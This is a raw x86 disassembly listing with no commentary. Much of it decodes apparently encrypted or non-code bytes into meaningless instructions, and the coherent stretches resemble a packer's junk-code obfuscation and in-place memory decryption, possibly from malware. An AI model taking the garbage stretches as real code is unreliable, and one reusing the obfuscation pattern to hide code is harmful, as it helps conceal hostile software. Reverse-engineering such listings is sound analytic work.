  4021e0:	jecxz  0x40223e
  4021e2:	stc    
  4021e3:	lods   eax,DWORD PTR ds:[esi]
  4021e4:	imul   edi
  4021e6:	outs   dx,BYTE PTR ds:[esi]
  4021e7:	xor    eax,0x50689b11
  4021ec:	fmul   QWORD PTR [edx-0x17994a5b]
  4021f2:	out    0xfb,al
  4021f4:	jmp    0x97b6:0xbe48e4fc
  4021fb:	loop   0x4021f4
  4021fd:	imul   esp,DWORD PTR [eax-0x9],0x66
  402201:	dec    edx
  402202:	push   cs
  402203:	int    0x24
  402205:	xchg   bl,dh
  402207:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402208:	fnstsw WORD PTR [edi]
  40220a:	mov    eax,ds:0x4cd884ec
  40220f:	daa    
  402210:	aam    0x1c
  402212:	xchg   ebp,eax
  402213:	xchg   edx,eax
  402214:	leave  
  402215:	push   ss
  402216:	jmp    0x402270
  402218:	mov    ebx,0xb321a435
  40221d:	pop    edi
  40221e:	(bad)  [ecx+edx*8]
  402221:	xor    ah,BYTE PTR [ebp-0x4a]
  402224:	(bad)  
  402225:	setnp  BYTE PTR [edx-0x3b215aed]
  40222c:	mov    bl,0xd0
  40222e:	mov    ah,BYTE PTR [edi]
  402230:	leave  
  402231:	inc    edx
  402232:	adc    DWORD PTR [ebx],edi
  402234:	int    0x36
  402236:	mov    ah,0x7
  402238:	aas    
  402239:	mov    ah,0xaf
  40223b:	push   esp
  40223c:	arpl   WORD PTR [ecx+edi*4-0x133ad20c],bx
  402243:	sub    DWORD PTR [edx],0x33627609
  402249:	add    ah,BYTE PTR [ebx+0x35770e1b]
  40224f:	sbb    al,0x7f
  402251:	xor    eax,0x55b43ed1
  402256:	aad    0xbf
  402258:	lock xchg ebp,eax
  40225a:	add    ebx,DWORD PTR [esi-0x7ba86d00]
  402260:	inc    eax
  402261:	daa    
  402262:	pop    edi
  402263:	add    eax,0xc8aab3f1
  402268:	in     eax,dx
  402269:	dec    ebp
  40226a:	ret    
  40226b:	adc    cl,ch
  40226d:	and    eax,0x99db8256
  402272:	fstp   QWORD PTR [edi]
  402274:	loop   0x40220a
  402276:	jmp    0xe1b64a8d
  40227b:	cmp    DWORD PTR [eax],ebp
  40227d:	adc    BYTE PTR [ebp-0x2d6fb2e5],bh
  402283:	aaa    
  402284:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402285:	sahf   
  402286:	data16 cmp al,BYTE PTR [edi+eax*1+0x59adfe77]
  40228e:	push   esp
  40228f:	imul   edx,DWORD PTR [ebx+0x52],0x6f32968a
  402296:	aad    0x61
  402298:	jmp    0x922fb532
  40229d:	lea    edx,[ecx-0x76]
  4022a0:	iret   
  4022a1:	xchg   ebp,eax
  4022a2:	int3   
  4022a3:	pop    esi
  4022a4:	sbb    DWORD PTR [ebp+0x7d129831],ebp
  4022aa:	push   0x78
  4022ac:	test   BYTE PTR [edx+eiz*1+0x5c],ch
  4022b0:	out    0x10,al
  4022b2:	xchg   ebp,eax
  4022b3:	ds xchg esi,eax
  4022b5:	sbb    edi,DWORD PTR [esi]
  4022b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022b8:	outs   dx,BYTE PTR ds:[esi]
  4022b9:	fs sbb ecx,0xffffffff
  4022bd:	or     BYTE PTR [esi],al
  4022bf:	mov    ebx,0x40cdd563
  4022c4:	jmp    0x402334
  4022c6:	aas    
  4022c7:	jne    0x4022c1
  4022c9:	jns    0x40228b
  4022cb:	bound  ecx,QWORD PTR ds:0x68e709fe
  4022d1:	and    DWORD PTR [ebx-0x158b2559],0x41
  4022d8:	fnstcw WORD PTR [esi-0xbc5f57f]
  4022de:	les    edx,FWORD PTR [edi-0x16f4ac8a]
  4022e4:	push   ss
  4022e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022e6:	mov    ds:0x537ace65,al
  4022eb:	out    0x60,al
  4022ed:	test   eax,0x64f1f7cb
  4022f2:	push   ebp
  4022f3:	aam    0x53
  4022f5:	mov    WORD PTR [ebp-0x2c0d7fd2],bp
  4022fc:	test   BYTE PTR [ebp+0x7608bb8e],dh
  402302:	mov    ah,0x97
  402304:	xchg   BYTE PTR [ecx],dh
  402306:	ds mov esp,0xb7634aa6
  40230c:	nop
  40230d:	cmp    eax,0x3ac7cbd
  402312:	ins    BYTE PTR es:[edi],dx
  402313:	adc    al,0xa3
  402315:	mov    edx,0xb6701b66
  40231a:	call   0x3594f230
  40231f:	ins    BYTE PTR es:[edi],dx
  402320:	adc    ch,BYTE PTR [edx]
  402322:	int3   
  402323:	inc    esp
  402324:	inc    ebx
  402325:	lods   eax,DWORD PTR ds:[esi]
  402326:	(bad)  
  402327:	sti    
  402328:	test   DWORD PTR [ecx],edi
  40232a:	jmp    0x40234f
  40232c:	push   0xf3442fd3
  402331:	or     edx,DWORD PTR [ebp+0x17a904ff]
  402337:	lods   eax,DWORD PTR ds:[esi]
  402338:	cs pop ds
  40233a:	and    al,0xd5
  40233c:	mov    al,ds:0x8c70494a
  402341:	adc    eax,DWORD PTR [edx-0x59]
  402344:	sub    ecx,DWORD PTR [esi-0x4478913c]
  40234a:	mov    dl,0x7b
  40234c:	inc    ecx
  40234d:	inc    ebp
  40234e:	sub    DWORD PTR [ecx-0x47],edx
  402351:	inc    esp
  402352:	cmp    BYTE PTR ss:[ebx-0x7e],dh
  402356:	jbe    0x4023c8
  402358:	or     DWORD PTR [ebp-0x17530aee],ecx
  40235e:	stos   DWORD PTR es:[edi],eax
  40235f:	fwait
  402360:	sbb    bl,0x7f
  402363:	lock mov bh,0x10
  402366:	jmp    0xd36adce4
  40236b:	inc    edx
  40236c:	cmp    al,0x12
  40236e:	ficom  DWORD PTR [edi]
  402370:	adc    eax,0xe785a8c5
  402375:	inc    ch
  402377:	push   0x1f1a109b
  40237c:	lahf   
  40237d:	outs   dx,BYTE PTR ds:[esi]
  40237e:	and    eax,0xb185d5
  402383:	cmp    edx,edi
  402385:	inc    ebx
  402386:	push   edi
  402387:	(bad)  
  402388:	and    edx,DWORD PTR [edx+0xca78dad]
  40238e:	fdivrp st(1),st
  402390:	ins    DWORD PTR es:[edi],dx
  402391:	and    al,al
  402393:	out    0x76,al
  402395:	rol    BYTE PTR [ebx-0x6],cl
  402398:	mov    dl,0x14
  40239a:	jge    0x402358
  40239c:	loop   0x402329
  40239e:	mov    ch,0x6
  4023a0:	cmp    al,0x96
  4023a2:	mov    esi,0xa3851b86
  4023a7:	mov    esi,0xbe93452a
  4023ac:	nop
  4023ad:	test   eax,0xebdc6498
  4023b2:	and    DWORD PTR [ecx+ebp*8+0x51],edx
  4023b6:	mov    al,ds:0x17d80335
  4023bb:	cmp    al,bh
  4023bd:	ins    BYTE PTR es:[edi],dx
  4023be:	mov    dh,0xd4
  4023c0:	lds    ebx,FWORD PTR [ebp+0x10]
  4023c3:	xchg   esi,eax
  4023c4:	icebp  
  4023c5:	in     al,0x8d
  4023c7:	push   edi
  4023c8:	mov    ds:0xf3159bbb,al
  4023cd:	add    esi,DWORD PTR [esp+esi*1+0x75191850]
  4023d4:	cs push edx
  4023d6:	sub    edx,DWORD PTR [ebp+edx*4+0x1b]
  4023da:	fld    DWORD PTR [esi+0x1d]
  4023dd:	adc    eax,0xdf92aa0
  4023e2:	loope  0x40245b
  4023e4:	test   BYTE PTR [edi],0xb2
  4023e7:	scas   al,BYTE PTR es:[edi]
  4023e8:	shr    edi,0x73
  4023eb:	stos   BYTE PTR es:[edi],al
  4023ec:	xor    bh,ah
  4023ee:	mov    ds:0xe9102eb7,eax
  4023f3:	aam    0x63
  4023f5:	add    eax,0x1209dbbd
  4023fa:	or     eax,0xf685533
  4023ff:	sub    eax,0x1d810000
  402404:	cmp    DWORD PTR [edx+eax*2+0x42846100],eax
  40240b:	add    al,ch
  40240d:	jne    0x40240d
  40240f:	add    DWORD PTR [eax],eax
  402411:	mov    ecx,DWORD PTR [ebp-0x68]
  402414:	mov    edx,DWORD PTR ds:0x428459
  40241a:	add    DWORD PTR ds:0x428375,edx
  402420:	mov    edx,DWORD PTR [ebp-0x64]
  402423:	sub    DWORD PTR ds:0x428545,ecx
  402429:	xor    eax,ecx
  40242b:	sub    DWORD PTR ds:0x4284dd,edi
  402431:	mov    ecx,DWORD PTR [ebp-0x70]
  402434:	mov    edx,DWORD PTR [ebp-0x6c]
  402437:	neg    DWORD PTR ds:0x42857d
  40243d:	sub    eax,ecx
  40243f:	mov    ecx,DWORD PTR ds:0x422738
  402445:	lea    eax,[eax+ecx*1-0x27d2]
  40244c:	not    edx
  40244e:	mov    ecx,DWORD PTR [ebp-0x1c]
  402451:	adc    edx,DWORD PTR ds:0x4284c5
  402457:	mov    edx,DWORD PTR [ebp-0x2c]
  40245a:	neg    DWORD PTR ds:0x42843d
  402460:	or     ecx,0x4f00
  402466:	and    ecx,edx
  402468:	cmp    DWORD PTR ds:0x42832d,0x0
  40246f:	mov    DWORD PTR ds:0x428549,ebx
  402475:	mov    edx,DWORD PTR ds:0x428445
  40247b:	jmp    0x4024db
  402480:	mov    DWORD PTR ds:0x428425,0xc4d
  40248a:	cmp    DWORD PTR ds:0x42832d,0x0
  402491:	jg     0x4024b5
  402497:	push   DWORD PTR [ebp-0x24]
  40249a:	push   DWORD PTR [ebp-0x28]
  40249d:	call   DWORD PTR ds:0x42dfe8
  4024a3:	xor    edx,DWORD PTR ds:0x428421
  4024a9:	adc    DWORD PTR ds:0x4284ed,ecx
  4024af:	add    edx,0x747e
  4024b5:	or     DWORD PTR ds:0x42854d,0x36ec
  4024bf:	neg    DWORD PTR ds:0x428545
  4024c5:	adc    edx,DWORD PTR ds:0x428341
  4024cb:	sbb    DWORD PTR ds:0x428581,edi
  4024d1:	sbb    DWORD PTR ds:0x42854d,0x669d
  4024db:	mov    edx,DWORD PTR [ebp-0x34]
  4024de:	or     ecx,edx
  4024e0:	xor    ecx,0x5fdd
  4024e6:	cmp    ecx,DWORD PTR [eax]
  4024e8:	mov    DWORD PTR ds:0x4284f1,0x2fd8
  4024f2:	jne    0x408bb3
  4024f8:	mov    ecx,DWORD PTR [esi]
  4024fa:	cmp    DWORD PTR ds:0x428501,0x0
  402501:	mov    DWORD PTR ds:0x428415,edi
  402507:	not    edx
  402509:	mov    DWORD PTR ds:0x4284f1,0x71cc
  402513:	jmp    0x402572
  402518:	mov    eax,ds:0x428501
  40251d:	mov    eax,0x2d63
  402522:	cmp    DWORD PTR ds:0x428501,0x0
  402529:	je     0x40255f
  40252f:	push   0x428369
  402534:	push   DWORD PTR [ebp-0x18]
  402537:	push   0x428255
  40253c:	push   0x6ba7
  402541:	call   DWORD PTR ds:0x42dfec
  402547:	sbb    edx,DWORD PTR ds:0x428375
  40254d:	xor    edx,DWORD PTR ds:0x42836d
  402553:	and    edx,edx
  402555:	mov    DWORD PTR ds:0x428429,0x7db9
  40255f:	add    DWORD PTR ds:0x428465,edx
  402565:	inc    edx
  402566:	and    DWORD PTR ds:0x428339,ecx
  40256c:	or     DWORD PTR ds:0x428481,ecx
  402572:	mov    eax,DWORD PTR [esi+0x4]
  402575:	shrd   ecx,eax,0x2
  402579:	shr    eax,0x2
  40257c:	adc    DWORD PTR ds:0x428371,ecx
  402582:	mov    eax,DWORD PTR [esi]
  402584:	movzx  edx,BYTE PTR ds:0x428431
  40258b:	or     DWORD PTR ds:0x428565,edx
  402591:	mov    edx,DWORD PTR [esi+0x4]
  402594:	shl    eax,0x1e
  402597:	xor    ecx,edi
  402599:	xor    eax,eax
  40259b:	or     eax,ecx
  40259d:	jmp    0x40293e
  4025a2:	cmp    al,0x5
  4025a4:	ja     0x4025d8
  4025a6:	jl     0x40255c
  4025a8:	mov    esp,0xb45d5307
  4025ad:	iret   
  4025ae:	push   ebx
  4025af:	mov    esp,0xdabe9e5e
  4025b4:	mov    esi,0xbec4bdbe
  4025b9:	mov    esi,0x894781bf
  4025be:	aad    0xa6
  4025c0:	inc    eax
  4025c1:	aad    0xbf
  4025c3:	cmp    al,0x2f
  4025c5:	dec    edx
  4025c6:	cmp    DWORD PTR [eax+0x3d],edi
  4025c9:	in     al,dx
  4025ca:	mov    ds:0x5fc75af5,al
  4025cf:	sti    
  4025d0:	popf   
  4025d1:	stos   DWORD PTR es:[edi],eax
  4025d2:	shr    DWORD PTR [edi+esi*4-0x2b],0x20
  4025d7:	into   
  4025d8:	jmp    0x6083429b
  4025dd:	js     0x40257c
  4025df:	and    BYTE PTR [ebp+esi*2+0x3384d14d],bl
  4025e6:	popa   
  4025e7:	in     eax,dx
  4025e8:	cmc    
  4025e9:	mov    esp,0xf739f9da
  4025ee:	mov    ebp,0xa97e443e
  4025f3:	cmp    al,0xa2
  4025f5:	(bad)  
  4025f6:	imul   esi,DWORD PTR [esi],0xb
  4025f9:	xchg   edi,eax
  4025fa:	cmc    
  4025fb:	shl    bl,1
  4025fd:	mov    ebp,DWORD PTR [edx+edi*2]
  402600:	fadd   DWORD PTR [ebx-0x33]
  402603:	sub    dh,BYTE PTR [ebx]
  402605:	std    
  402606:	mov    BYTE PTR [edx+edx*2],0xf8
  40260a:	aad    0x74
  40260c:	sub    al,0xf
  40260e:	adc    al,al
  402610:	mov    bh,0x96
  402612:	add    BYTE PTR [edi],bh
  402614:	je     0x4025eb
  402616:	out    dx,eax
  402617:	imul   esi
  402619:	cs enter 0xd658,0xc5
  40261e:	loop   0x402610
  402620:	dec    ebp
  402621:	imul   esp,DWORD PTR [ecx-0x94848ef],0x9c0c7174
  40262b:	mov    dh,BYTE PTR [esi+0x49ae98cb]
  402631:	or     DWORD PTR [esi-0x2834f96c],ebp
  402637:	imul   BYTE PTR [ecx]
  402639:	popa   
  40263a:	call   0x3a1b:0xde509836
  402641:	xchg   ebp,edx
  402643:	scas   eax,DWORD PTR es:[edi]
  402644:	int    0xf7
  402646:	pop    ebx
  402647:	bound  esi,QWORD PTR [edx+0x3b]
  40264a:	or     BYTE PTR [eax+esi*2],ah
  40264d:	sub    bh,BYTE PTR [esi+0x4d]
  402650:	mov    eax,ds:0xb304ab3a
  402655:	add    eax,0xc57d061
  40265a:	xor    eax,0xd5824e32
  40265f:	mov    dh,0x50
  402661:	sbb    esi,eax
  402663:	push   ss
  402664:	mov    ebp,DWORD PTR [ecx]
  402666:	inc    ecx
  402667:	retf   0x6897
  40266a:	popa   
  40266b:	cmp    ah,BYTE PTR [ebx+0x34]
  40266e:	call   0xe60114b8
  402673:	(bad)  
  402674:	jbe    0x40266a
  402676:	mov    esi,0x5bd9fc7a
  40267b:	fucomip st,st(1)
  40267d:	dec    esp
  40267e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40267f:	adc    eax,0xc0999508
  402684:	outs   dx,DWORD PTR ds:[esi]
  402685:	mov    eax,0x3217b622
  40268a:	jb     0x4026a4
  40268c:	cmc    
  40268d:	stos   BYTE PTR es:[edi],al
  40268e:	mov    ds:0x7e66ad7e,eax
  402693:	push   es
  402694:	pop    ss
  402695:	outs   dx,BYTE PTR ds:[esi]
  402696:	xor    al,0x93
  402699:	int3   
  40269a:	rcl    DWORD PTR [edx+0x49],0x80
  40269e:	mov    WORD PTR [edi],es
  4026a0:	jge    0x4026a0
  4026a2:	sub    al,0x33
  4026a4:	leave  
  4026a5:	and    al,0xc1
  4026a7:	add    eax,0x206ee53d
  4026ac:	mov    dh,0x6d
  4026ae:	jl     0x402689
  4026b0:	jmp    0x402665
  4026b2:	popa   
  4026b3:	in     al,0x88
  4026b5:	fisub  WORD PTR [eax+0x4f1f756d]
  4026bb:	popf   
  4026bc:	push   eax
  4026bd:	pop    eax
  4026be:	mov    esi,0x4d6fb56a
  4026c3:	ret    
  4026c4:	mov    bl,0x6a
  4026c6:	sub    al,0xe3
  4026c8:	scas   al,BYTE PTR es:[edi]
  4026c9:	js     0x4026e2
  4026cb:	sub    al,0xf3
  4026cd:	adc    DWORD PTR [ebx+0x1db46bd3],ecx
  4026d3:	addr16 aas 
  4026d5:	rcr    DWORD PTR [ebp+0x46],1
  4026d8:	cs dec esi
  4026da:	retf   0x9bad
  4026dd:	sar    DWORD PTR [eax],1
  4026df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026e0:	lods   al,BYTE PTR ds:[esi]
  4026e1:	dec    ecx
  4026e2:	dec    ebx
  4026e3:	mov    BYTE PTR [edi],0xab
  4026e6:	add    ecx,DWORD PTR es:[ebx]
  4026e9:	adc    DWORD PTR [eax],ebx
  4026eb:	jnp    0x4026fb
  4026ed:	or     DWORD PTR [ecx+edi*8],esi
  4026f0:	sbb    al,0x44
  4026f2:	(bad)  
  4026f3:	cmp    ecx,ecx
  4026f5:	sbb    dh,al
  4026f7:	fistp  WORD PTR [edx+0xcbb4a56]
  4026fd:	cmp    ebp,edx
  4026ff:	dec    eax
  402700:	inc    eax
  402701:	ret    0x8a04
  402704:	imul   esi,eax,0x3
  402707:	sbb    edx,ebp
  402709:	or     ebx,0x8066a9ad
  40270f:	popf   
  402710:	icebp  
  402711:	test   BYTE PTR [edi],dh
  402713:	fist   WORD PTR [edi+ecx*1+0x50]
  402717:	mov    cl,cl
  402719:	push   edx
  40271a:	sar    dh,cl
  40271c:	(bad)  
  40271d:	rcr    BYTE PTR [ebx+0x5],0xe3
  402721:	xor    eax,0xf019ede4
  402726:	gs mov ebp,0xfdbbe0b7
  40272c:	outs   dx,BYTE PTR ds:[esi]
  40272d:	fcom   QWORD PTR [ecx-0x24aa3b62]
  402733:	adc    DWORD PTR [esi+0x1b8177db],esp
  402739:	das    
  40273a:	test   eax,0xb4dde6e4
  40273f:	cmp    al,0x27
  402741:	jmp    0x40272e
  402743:	add    edx,0x48232a06
  402749:	add    DWORD PTR [edx*8-0x2a5fca35],0xdcbcd9e4
  402754:	xchg   esp,eax
  402755:	mov    esp,0xe0665dd4
  40275a:	je     0x402759
  40275c:	aam    0x53
  40275e:	mov    bh,0x24
  402760:	pop    ecx
  402761:	jmp    0x40277a
  402763:	scas   eax,DWORD PTR es:[edi]
  402764:	jb     0x402735
  402766:	sbb    al,0x6
  402768:	das    
  402769:	aas    
  40276a:	jno    0x402735
  40276c:	mov    eax,ds:0xc413b38d
  402771:	inc    eax
  402773:	or     ah,BYTE PTR [ebp*8-0x79bb74a7]
  40277a:	and    al,0xcc
  40277c:	jo     0x4027c1
  40277e:	and    BYTE PTR [ecx-0x59],dh
  402781:	adc    ecx,0x75b363ce
  402787:	add    esp,DWORD PTR [ecx+edx*2+0x23599532]
  40278e:	loopne 0x402731
  402790:	dec    ecx
  402791:	into   
  402792:	std    
  402793:	mov    ebp,0xbf680c8c
  402798:	or     al,0x36
  40279a:	push   ss
  40279b:	mov    dh,0x29
  40279d:	ins    DWORD PTR es:[edi],dx
  40279e:	and    ah,BYTE PTR fs:[ebx]
  4027a1:	or     ebx,DWORD PTR [edi]
  4027a3:	clc    
  4027a4:	xchg   esp,eax
  4027a5:	je     0x40273a
  4027a7:	addr16 in eax,dx
  4027a9:	mov    ds:0xbd4128eb,eax
  4027ae:	repnz inc edi
  4027b0:	icebp  
  4027b1:	and    bl,BYTE PTR ds:0x55c40994
  4027b7:	popf   
  4027b8:	cli    
  4027b9:	fild   WORD PTR [eax]
  4027bb:	(bad)  
  4027bd:	fistp  WORD PTR [ebp+0x5f]
  4027c0:	cdq    
  4027c1:	ret    
  4027c2:	in     al,dx
  4027c3:	cdq    
  4027c4:	(bad)  
  4027c5:	cmp    DWORD PTR [ecx+ebp*8],ebp
  4027c8:	inc    ecx
  4027c9:	jnp    0x402788
  4027cb:	clc    
  4027cc:	retf   0xf12e
  4027cf:	dec    ebp
  4027d0:	pop    esp
  4027d1:	lods   al,BYTE PTR ds:[esi]
  4027d2:	sub    DWORD PTR ss:[ebp-0x32a3de72],edi
  4027d9:	retf   0x6215
  4027dc:	popa   
  4027dd:	jne    0x40281e
  4027df:	cmp    esi,DWORD PTR [edi+0x371ad8c4]
  4027e5:	mov    dh,0xc4
  4027e7:	xchg   ecx,eax
  4027e8:	in     eax,0xfa
  4027ea:	cmp    bl,BYTE PTR [ecx-0x3a]
  4027ed:	push   ds
  4027ee:	inc    esi
  4027ef:	mov    al,ds:0x41b5e23c
  4027f4:	fcmovne st,st(0)
  4027f6:	jo     0x4027d9
  4027f8:	pop    ss
  4027f9:	adc    ch,BYTE PTR [esi]
  4027fb:	jo     0x402786
  4027fd:	jns    0x40278b
  4027ff:	into   
  402800:	lea    edi,[ecx+0x4c]
  402803:	mov    ds:0x231bc141,al
  402808:	dec    esp
  402809:	sar    DWORD PTR [eax],0x7f
  40280c:	xor    BYTE PTR [ebx-0x63cd67a5],ah
  402812:	inc    esp
  402813:	(bad)  
  402814:	jmp    0x402816
  402816:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402817:	jmp    0x1371abf3
  40281c:	in     eax,0x49
  40281e:	je     0x40285f
  402820:	pop    edx
  402821:	scas   eax,DWORD PTR es:[edi]
  402822:	retf   
  402823:	lods   eax,DWORD PTR ds:[esi]
  402824:	shl    BYTE PTR [edx-0x74],1
  402827:	fdivr  QWORD PTR [edx+0x4c512d08]
  40282d:	outs   dx,DWORD PTR ds:[esi]
  40282e:	jg     0x4027ef
  402830:	sbb    dh,BYTE PTR [eax-0x48270966]
  402836:	push   0xb3e1410
  40283b:	arpl   WORD PTR [ebx],di
  40283d:	jge    0x402881
  40283f:	xor    BYTE PTR [ebx+ebp*8-0x48],dl
  402843:	inc    esp
  402844:	cmp    bl,BYTE PTR [eax]
  402846:	stc    
  402847:	pop    ebp
  402848:	fisub  WORD PTR [esi]
  40284a:	pop    ss
  40284b:	outs   dx,BYTE PTR ds:[esi]
  40284c:	pop    ebx
  40284d:	push   es
  40284e:	outs   dx,BYTE PTR ds:[esi]
  40284f:	bound  ecx,QWORD PTR [ebp-0x57]
  402852:	mov    al,ds:0xde4c1412
  402857:	mov    eax,gs:0xddcf7715
  40285d:	call   0x4eec9545
  402862:	jns    0x402812
  402864:	xchg   ebp,eax
  402865:	sub    BYTE PTR [ebx],al
  402867:	mov    eax,0x2088c53d
  40286c:	lock push 0x87c78114
  402872:	xchg   esp,eax
  402873:	jno    0x4028ae
  402875:	xchg   esi,eax
  402876:	adc    al,0xb2
  402878:	mov    ebx,0xea54559a
  40287d:	xor    ch,BYTE PTR [ecx+0x7]
  402880:	or     DWORD PTR [ecx-0xa],0xdeb55f31
  402887:	lock cmp DWORD PTR [esi+0x74],esi
  40288b:	mov    edi,0x794d0327
  402890:	inc    esp
  402891:	loope  0x40284e
  402893:	addr16 rol esi,1
  402896:	sub    bh,BYTE PTR [edx]
  402898:	imul   DWORD PTR [edi+edx*2+0x7b6a21fd]
  40289f:	mov    ecx,0x79180130
  4028a4:	out    0xb7,eax
  4028a6:	cwde   
  4028a7:	fdivr  QWORD PTR [edx]
  4028a9:	daa    
  4028aa:	or     eax,0x856ab7f2
  4028af:	test   al,0x33
  4028b1:	cld    
  4028b2:	pop    es
  4028b3:	iret   
  4028b4:	or     al,0x8c
  4028b6:	jl     0x4028e1
  4028b8:	out    dx,eax
  4028b9:	hlt    
  4028ba:	or     DWORD PTR ds:0xce4dc8b7,esp
  4028c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028c1:	dec    ebp
  4028c2:	mov    esp,0xf21f9fd3
  4028c7:	test   ebp,edi
  4028c9:	ror    DWORD PTR [ebp+0x7a],1
  4028cc:	inc    ecx
  4028cd:	mov    bh,0x80
  4028cf:	scas   eax,DWORD PTR es:[edi]
  4028d0:	retf   
  4028d1:	jo     0x4028d6
  4028d3:	xchg   ecx,eax
  4028d4:	test   al,0x7
  4028d6:	xor    edx,ebp
  4028d8:	out    0xf0,al
  4028da:	mov    dh,0xa8
  4028dc:	rol    DWORD PTR [edx+0xa43fa90],cl
  4028e2:	out    dx,eax
  4028e3:	imul   edx,DWORD PTR [ebx],0x2171f408
  4028e9:	in     eax,0xdf
  4028eb:	dec    edx
  4028ec:	enter  0x2a8a,0xf2
  4028f0:	scas   al,BYTE PTR es:[edi]
  4028f1:	or     al,0x8c
  4028f3:	pushf  
  4028f4:	test   BYTE PTR [eax+0x3886fe8b],al
  4028fa:	mov    ds:0xafde269e,eax
  4028ff:	push   eax
  402900:	cmp    al,0x7a
  402902:	aad    0x31
  402904:	and    BYTE PTR [eax-0x599f8855],0x31
  40290b:	adc    eax,0x146cdc15
  402910:	pop    ebp
  402911:	aaa    
  402912:	xchg   esp,eax
  402913:	div    BYTE PTR [ebx+ebp*4+0x686c9c7f]
  40291a:	clc    
  40291b:	test   ch,ah
  40291d:	and    BYTE PTR [ebx+0x36a27156],bl
  402923:	arpl   di,si
  402925:	sbb    eax,0xc7a322b7
  40292a:	out    0xe1,eax
  40292c:	(bad)  
  40292d:	cmp    bh,cl
  40292f:	dec    eax
  402930:	mov    ebp,0x508c1524
  402935:	pop    edi
  402936:	inc    ebx
  402937:	adc    al,0x58
  402939:	paddd  mm0,QWORD PTR [eax+0x4d8b66b5]
  402940:	in     al,dx
  402941:	cmp    eax,DWORD PTR [ecx]
  402943:	mov    DWORD PTR ds:0x428429,0x7e19
  40294d:	jne    0x402a3a
  402953:	cmp    DWORD PTR ds:0x4284f1,0x0
  40295a:	mov    DWORD PTR ds:0x428545,edi
  402960:	mov    ecx,0x5bac
  402965:	mov    ecx,0x785
  40296a:	jmp    0x4029c0
  40296f:	mov    DWORD PTR ds:0x4284f5,0x7d3d
  402979:	mov    eax,ds:0x428351
  40297e:	cmp    DWORD PTR ds:0x4284f1,0x0
  402985:	jl     0x4029a6
  40298b:	push   0x25e9
  402990:	call   DWORD PTR ds:0x42e238
  402996:	and    ecx,0x7efc
  40299c:	and    DWORD PTR ds:0x428481,0x428369
  4029a6:	sub    edx,edx
  4029a8:	and    DWORD PTR ds:0x428555,0x3b56
  4029b2:	mov    edx,DWORD PTR ds:0x42852d
  4029b8:	mov    edx,DWORD PTR [edx]
  4029ba:	add    DWORD PTR ds:0x428445,edx
  4029c0:	mov    eax,DWORD PTR [ebp-0xc]
  4029c3:	mov    ecx,DWORD PTR [ebp+0x20]
  4029c6:	sub    DWORD PTR ds:0x428375,edi
  4029cc:	xor    DWORD PTR [eax],ecx
  4029ce:	mov    eax,DWORD PTR [ebp-0xc]
  4029d1:	or     edx,ecx
  4029d3:	mov    ecx,DWORD PTR [ebp+0x18]
  4029d6:	or     DWORD PTR ds:0x428451,ebx
  4029dc:	mov    edx,DWORD PTR [ebp+0x1c]
  4029df:	add    DWORD PTR ds:0x42834d,0x2a87
  4029e9:	shrd   ecx,edx,0x2
  4029ed:	sub    DWORD PTR ds:0x42845d,0x428435
  4029f7:	mov    DWORD PTR [ebp-0x14],ecx
  4029fa:	mov    ecx,DWORD PTR [ebp+0x18]
  4029fd:	xor    DWORD PTR [ebp-0x14],edi
  402a00:	shr    edx,0x2
  402a03:	xor    edx,0x4270
  402a09:	mov    edx,DWORD PTR [ebp+0x1c]
  402a0c:	sbb    DWORD PTR ds:0x428409,0x428425
  402a16:	xor    edx,edx
  402a18:	and    DWORD PTR ds:0x428579,0x428331
  402a22:	or     edx,DWORD PTR [ebp-0x14]
  402a25:	or     DWORD PTR ds:0x428451,0x6ae7
  402a2f:	shl    ecx,0x1e
  402a32:	xor    DWORD PTR ds:0x428369,edx
  402a38:	sub    DWORD PTR [eax],edx
  402a3a:	xor    ecx,ecx
  402a3c:	add    ecx,DWORD PTR ds:0x4284c1
  402a42:	mov    eax,ds:0x428539
  402a47:	sub    eax,ecx
  402a49:	add    ecx,DWORD PTR [ecx+eax*1]
  402a4c:	mov    eax,ds:0x422580
  402a51:	add    edx,DWORD PTR ds:0x428365
  402a57:	mov    ecx,DWORD PTR [ebp-0xc]
  402a5a:	cmp    DWORD PTR ds:0x428419,0x0
  402a61:	not    edx
  402a63:	not    DWORD PTR ds:0x42834d
  402a69:	movzx  edx,WORD PTR ds:0x42833d
  402a70:	jmp    0x402ae1
  402a75:	mov    edx,0x6743
  402a7a:	cmp    DWORD PTR ds:0x428419,0x0
  402a81:	jg     0x402ac1
  402a87:	push   0x8e71
  402a8c:	push   DWORD PTR [ebp-0x1c]
  402a8f:	call   DWORD PTR ds:0x42dff0
  402a95:	movzx  edx,WORD PTR ds:0x428469
  402a9c:	sbb    edx,DWORD PTR ds:0x428561
  402aa2:	mov    DWORD PTR ds:0x428469,edx
  402aa8:	movzx  edx,BYTE PTR ds:0x428471
  402aaf:	adc    DWORD PTR ds:0x428549,edx
  402ab5:	or     edx,0x3af6
  402abb:	and    edx,DWORD PTR ds:0x42832d
  402ac1:	or     DWORD PTR ds:0x428369,0x67f9
  402acb:	add    edx,0x3b45
  402ad1:	or     edx,DWORD PTR ds:0x4284d1
  402ad7:	adc    DWORD PTR ds:0x428549,0x3eb0
  402ae1:	mov    eax,DWORD PTR [eax]
  402ae3:	cmp    DWORD PTR ds:0x428351,0x0
  402aea:	mov    DWORD PTR ds:0x4284d9,0xab9
  402af4:	mov    edx,DWORD PTR ds:0x42836d
  402afa:	mov    DWORD PTR ds:0x428341,0x238f
  402b04:	jmp    0x402b79
  402b09:	mov    DWORD PTR ds:0x428575,ecx
  402b0f:	cmp    DWORD PTR ds:0x428351,0x0
  402b16:	ja     0x402b5f
  402b1c:	push   DWORD PTR [ebp-0x14]
  402b1f:	push   0x428191
  402b24:	push   DWORD PTR [ebp-0x10]
  402b27:	push   0x428238
  402b2c:	push   DWORD PTR [ebp-0x18]
  402b2f:	push   0x24b6
  402b34:	call   DWORD PTR ds:0x42e23c
  402b3a:	mov    edx,DWORD PTR ds:0x428375
  402b40:	sub    DWORD PTR ds:0x42835d,edx
  402b46:	sbb    DWORD PTR ds:0x428449,ebx
  402b4c:	movzx  edx,BYTE PTR ds:0x42832d
